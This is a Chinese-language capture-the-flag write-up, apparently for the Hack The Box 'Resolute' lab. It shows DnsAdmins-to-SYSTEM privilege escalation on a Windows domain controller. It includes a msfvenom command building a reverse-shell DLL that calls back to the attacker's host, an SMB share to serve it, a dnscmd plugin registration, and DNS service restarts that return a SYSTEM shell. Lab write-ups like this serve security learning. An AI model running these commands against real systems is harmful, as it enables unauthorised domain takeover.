那我们直接当dc域控那样来提权，而且这个ryan用户是Dnsadmin，显然是dns的管理用户，我们来搜索一下dnsadmin有没有什么利用方式

找到https://www.anquanke.com/post/id/86080，翻译可能有偏差，想看原文的大佬可以查看引用的原文。

简单来说就是我们作为dnsadmin用户组的用户可以指定区域内用户使用dns服务时来加载我们自己的恶意dll，那么msf生成dll之后就可以回弹shell上线了

这是具体的利用方式

http://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/

  1. Making a dll payload that sends a reverse shell back to our machine with msfvenom.

  2. Serving it using SMB Server to make it available to the Windows machine. (You can use any other way to transfer it to the remote machine, but be careful, it might get nuked by the Anti-Virus.) And, we will also setup a netcat listener to catch our reverse shell.

  3. Importing that dll in the DNS Server.

  4. Restarting the DNS Server so that it loads the dll file.

1、用msfvenom制作一个dll的payload用来发送一个反向的shell回弹到我们的主机上

2、搭建smb服务，开启ncat监听

3、将生成的dll的payload导入dns服务器

4、重启dns服务以至于他可以加载我们的dll文件

我们开始操作生成payload

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=8888 -f dll > plugin.dll

‍

放到目录下，启动smbserver。kali下可以locate smbserver.py一下看到在/usr/local/bin/下。

启动方式

python smbserver.py SHARE ~/htb/resolute-10.10.10.169

smbserver.py shareName sharePath

在靶机上的ps里头执行

dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.8\share\plugin.dll

在新终端中nc监听8888

靶机上执行

sc.exe \\10.10.10.169 stop dns

sc.exe \\10.10.10.169 start dns

重启dns服务后即可收到弹回的system会话
